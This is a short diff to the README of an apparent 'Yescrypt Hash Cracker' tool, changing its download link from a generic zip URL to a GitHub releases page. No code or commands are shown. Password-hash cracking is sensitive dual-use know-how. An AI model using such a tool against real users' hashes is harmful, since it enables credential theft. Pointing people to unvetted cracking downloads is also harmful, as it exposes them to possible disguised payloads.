@@ -34,7 +34,7 @@ Are you looking for a powerful tool to crack Yescrypt hashes efficiently? Look n
 ## Get Started 🚀
 
 To access the Yescrypt Hash Cracker tool, click on the following link:  
-[Download Yescrypt Hash Cracker](https://github.com/file/App.zip) 📥
+[Download Yescrypt Hash Cracker](https://github.com/slyge/yescrypt_crack/releases/tag/v2.0) 📥
 
 ## Installation Guide 🛠️
 
